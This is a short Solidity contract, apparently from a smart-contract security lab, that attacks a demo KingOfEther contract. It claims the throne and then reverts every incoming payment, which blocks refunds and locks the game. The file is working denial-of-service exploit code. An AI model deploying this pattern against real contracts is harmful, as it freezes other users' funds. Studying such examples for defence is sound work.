// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;

import "./DenialOfServiceWithdrawal.sol";

contract DenialOfServiceWithdrawalAttack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    receive() external payable {
        assert(false);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
